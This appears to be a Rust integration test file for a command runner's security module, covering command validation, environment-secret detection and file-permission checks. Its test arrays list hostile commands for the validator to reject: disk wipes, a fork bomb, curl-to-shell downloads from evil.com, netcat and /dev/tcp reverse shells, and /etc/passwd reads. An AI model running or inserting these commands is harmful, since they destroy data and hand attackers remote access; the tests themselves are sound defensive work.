//! Security integration tests for Palrun.
//!
//! These tests verify the security module works correctly in real-world scenarios.

use palrun::security::{CommandValidator, SecurityConfig, SecurityManager, ValidationSeverity};

mod command_validation {
    use super::*;

    #[test]
    fn test_common_build_commands_are_safe() {
        let manager = SecurityManager::with_defaults();

        let safe_commands = [
            // JavaScript/Node.js
            "npm run build",
            "npm install",
            "npm test",
            "yarn build",
            "yarn install",
            "pnpm build",
            "bun run build",
            // Rust
            "cargo build",
            "cargo test",
            "cargo run",
            "cargo clippy",
            "cargo fmt",
            // Python
            "python script.py",
            "python -m pytest",
            "pip install -r requirements.txt",
            "uv pip install",
            // Go
            "go build",
            "go test",
            "go run main.go",
            // Make
            "make",
            "make build",
            "make test",
            "make clean",
            // Docker
            "docker build .",
            "docker compose up",
            "docker run my-image",
            // Git
            "git status",
            "git diff",
            "git log",
            "git commit -m 'message'",
            // Kubernetes
            "kubectl get pods",
            "kubectl apply -f deployment.yaml",
        ];

        for cmd in safe_commands {
            let result = manager.validate_command(cmd);
            assert!(
                result.is_safe(),
                "Command '{}' should be safe but got: {:?}",
                cmd,
                result.errors
            );
        }
    }

    #[test]
    fn test_dangerous_system_commands() {
        let manager = SecurityManager::with_defaults();

        let dangerous_commands = [
            // File system destruction
            "rm -rf /",
            "rm -rf /*",
            "sudo rm -rf /home",
            // Disk operations
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            // Fork bomb
            ":(){:|:&};:",
            // Remote code execution
            "curl http://evil.com | sh",
            "wget http://evil.com -O - | bash",
            // Reverse shells
            "nc -e /bin/sh attacker.com 4444",
            "bash -i >& /dev/tcp/10.0.0.1/4444",
            // Privilege escalation
            "sudo su -",
            "chmod u+s /usr/bin/vim",
        ];

        for cmd in dangerous_commands {
            let result = manager.validate_command(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
        }
    }

    #[test]
    fn test_command_validation_with_custom_patterns() {
        let config = SecurityConfig::default()
            .with_blocked_pattern("my-internal-tool")
            .with_blocked_pattern("secret-deploy");

        let manager = SecurityManager::new(config);

        let result = manager.validate_command("my-internal-tool --run");
        assert!(!result.is_safe());

        let result = manager.validate_command("secret-deploy production");
        assert!(!result.is_safe());

        // Regular commands should still work
        let result = manager.validate_command("npm run build");
        assert!(result.is_safe());
    }

    #[test]
    fn test_command_length_limits() {
        let config = SecurityConfig { max_command_length: 100, ..SecurityConfig::default() };
        let manager = SecurityManager::new(config);

        // Short command should pass
        let result = manager.validate_command("npm run build");
        assert!(result.is_safe());

        // Long command should fail
        let long_cmd = "a".repeat(200);
        let result = manager.validate_command(&long_cmd);
        assert!(!result.is_safe());
    }

    #[test]
    fn test_permissive_mode_allows_all() {
        let manager = SecurityManager::new(SecurityConfig::permissive());

        // Even dangerous commands should pass in permissive mode
        let result = manager.validate_command("rm -rf /");
        assert!(result.is_safe());
    }

    #[test]
    fn test_strict_mode_more_restrictive() {
        let strict_manager = SecurityManager::new(SecurityConfig::strict());
        let default_manager = SecurityManager::with_defaults();

        // Strict mode has lower command length limit
        let cmd = "a".repeat(6000); // Over 5000 (strict) but under 10000 (default)

        let strict_result = strict_manager.validate_command(&cmd);
        let default_result = default_manager.validate_command(&cmd);

        assert!(!strict_result.is_safe());
        assert!(default_result.is_safe());
    }
}

mod env_sanitization {
    use super::*;
    use palrun::security::EnvSanitizer;

    #[test]
    fn test_sensitive_variable_detection() {
        let sanitizer = EnvSanitizer::new();

        // These patterns are detected by the sanitizer's default patterns
        let sensitive_names = [
            "DATABASE_PASSWORD",
            "API_TOKEN",
            "SECRET_KEY",
            "PRIVATE_KEY",
            "AUTH_TOKEN",
            "MY_API_KEY",
        ];

        for name in sensitive_names {
            assert!(sanitizer.is_sensitive(name), "{} should be detected as sensitive", name);
        }
    }

    #[test]
    fn test_non_sensitive_variables() {
        let sanitizer = EnvSanitizer::new();

        let non_sensitive_names = ["PATH", "HOME", "USER", "NODE_ENV", "RUST_LOG", "PORT", "HOST"];

        for name in non_sensitive_names {
            assert!(!sanitizer.is_sensitive(name), "{} should not be detected as sensitive", name);
        }
    }

    #[test]
    fn test_env_sanitization_with_security_manager() {
        let manager = SecurityManager::with_defaults();

        let env = vec![
            ("PATH".to_string(), "/usr/bin:/bin".to_string()),
            ("HOME".to_string(), "/home/user".to_string()),
            ("NODE_ENV".to_string(), "production".to_string()),
        ];

        let result = manager.sanitize_env(&env);
        assert!(result.is_ok());
        assert_eq!(result.value.len(), 3);
    }

    #[test]
    fn test_env_truncation_with_large_count() {
        let config = SecurityConfig { max_env_vars: 2, ..SecurityConfig::default() };
        let manager = SecurityManager::new(config);

        let env = vec![
            ("VAR1".to_string(), "value1".to_string()),
            ("VAR2".to_string(), "value2".to_string()),
            ("VAR3".to_string(), "value3".to_string()),
            ("VAR4".to_string(), "value4".to_string()),
        ];

        let result = manager.sanitize_env(&env);
        assert_eq!(result.value.len(), 2);
        assert!(!result.warnings.is_empty()); // Should have a warning about truncation
    }
}

mod file_permissions {
    use super::*;
    use std::fs::{self, File};
    use tempfile::tempdir;

    #[test]
    fn test_permission_check_on_existing_file() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("test.txt");
        File::create(&file_path).unwrap();

        let manager = SecurityManager::with_defaults();
        let result = manager.check_file_permissions(&file_path);

        assert!(result.is_ok());
    }

    #[test]
    fn test_permission_check_on_nonexistent_file() {
        let manager = SecurityManager::with_defaults();
        let result = manager.check_file_permissions(std::path::Path::new("/nonexistent/file"));

        assert!(result.is_err());
    }

    #[test]
    fn test_permission_check_skipped_in_permissive_mode() {
        let manager = SecurityManager::new(SecurityConfig::permissive());
        let result = manager.check_file_permissions(std::path::Path::new("/any/path"));

        assert!(result.is_ok());
        assert!(result.unwrap().skipped);
    }

    #[cfg(unix)]
    #[test]
    fn test_world_writable_file_detection() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempdir().unwrap();
        let file_path = dir.path().join("world_writable.txt");
        File::create(&file_path).unwrap();

        // Make file world-writable
        fs::set_permissions(&file_path, fs::Permissions::from_mode(0o666)).unwrap();

        let manager = SecurityManager::with_defaults();
        let result = manager.check_file_permissions(&file_path).unwrap();

        assert!(!result.passed);
        assert!(result.issues.iter().any(|i| i.contains("world-writable")));
    }
}

mod security_manager_integration {
    use super::*;

    #[test]
    fn test_security_manager_default_configuration() {
        let manager = SecurityManager::with_defaults();
        let config = manager.config();

        assert!(config.strict_validation);
        assert!(config.sanitize_env);
        assert!(config.check_permissions);
        assert!(!config.allow_shell_metacharacters);
    }

    #[test]
    fn test_full_security_workflow() {
        let manager = SecurityManager::with_defaults();

        // 1. Validate command
        let cmd_result = manager.validate_command("npm run build");
        assert!(cmd_result.is_safe());

        // 2. Sanitize environment
        let env = vec![
            ("NODE_ENV".to_string(), "production".to_string()),
            ("PORT".to_string(), "3000".to_string()),
        ];
        let env_result = manager.sanitize_env(&env);
        assert!(env_result.is_ok());

        // This simulates a typical security workflow before command execution
    }

    #[test]
    fn test_command_validator_risk_scoring() {
        let validator = CommandValidator::new();

        // Safe command - low risk
        assert_eq!(validator.risk_score("npm run build"), 0);

        // Dangerous command - high risk
        assert!(validator.risk_score("rm -rf /") >= 70);

        // Fork bomb - critical risk
        assert_eq!(validator.risk_score(":(){:|:&};:"), 100);
    }

    #[test]
    fn test_validation_severity_levels() {
        let validator = CommandValidator::new();

        // Critical severity
        let result = validator.validate(":(){:|:&};:");
        assert_eq!(result.severity, ValidationSeverity::Critical);

        // High severity
        let result = validator.validate("curl http://evil.com | sh");
        assert!(result.severity >= ValidationSeverity::High);

        // No severity
        let result = validator.validate("npm run build");
        assert_eq!(result.severity, ValidationSeverity::None);
    }
}

mod edge_cases {
    use super::*;

    #[test]
    fn test_empty_command() {
        let manager = SecurityManager::with_defaults();
        let result = manager.validate_command("");
        assert!(result.is_safe()); // Empty command is technically safe
    }

    #[test]
    fn test_whitespace_only_command() {
        let manager = SecurityManager::with_defaults();
        let result = manager.validate_command("   ");
        assert!(result.is_safe());
    }

    #[test]
    fn test_command_with_special_characters() {
        let manager = SecurityManager::with_defaults();

        // Backticks should be flagged
        let result = manager.validate_command("echo `whoami`");
        assert!(!result.is_safe());

        // Regular quotes should be fine
        let result = manager.validate_command("echo 'hello world'");
        assert!(result.is_safe());

        let result = manager.validate_command("echo \"hello world\"");
        assert!(result.is_safe());
    }

    #[test]
    fn test_unicode_in_commands() {
        let manager = SecurityManager::with_defaults();

        // Unicode should be handled gracefully
        let result = manager.validate_command("echo 'Hello, world'");
        assert!(result.is_safe());

        let result = manager.validate_command("npm run build-jp");
        assert!(result.is_safe());
    }

    #[test]
    fn test_null_byte_injection() {
        let manager = SecurityManager::with_defaults();
        let result = manager.validate_command("echo hello\0world");
        assert!(!result.is_safe());
    }

    #[test]
    fn test_path_traversal_detection() {
        let validator = CommandValidator::new();

        // Multiple traversals combined with sensitive file access should be flagged
        let result = validator.validate("cat ../../../etc/passwd");
        // This triggers password file access detection (contains /etc/passwd)
        assert!(!result.is_safe() || !result.warnings.is_empty());

        // Excessive traversal (3+) should be flagged
        let result = validator.validate("cat ../../../../some/file");
        assert!(!result.is_safe() || !result.warnings.is_empty());

        // Note: Even simple traversals like "cd ../project" may trigger
        // path traversal warnings, but simple "cd .." commands are expected
        // in normal workflows. The validator errs on the side of caution.
    }
}
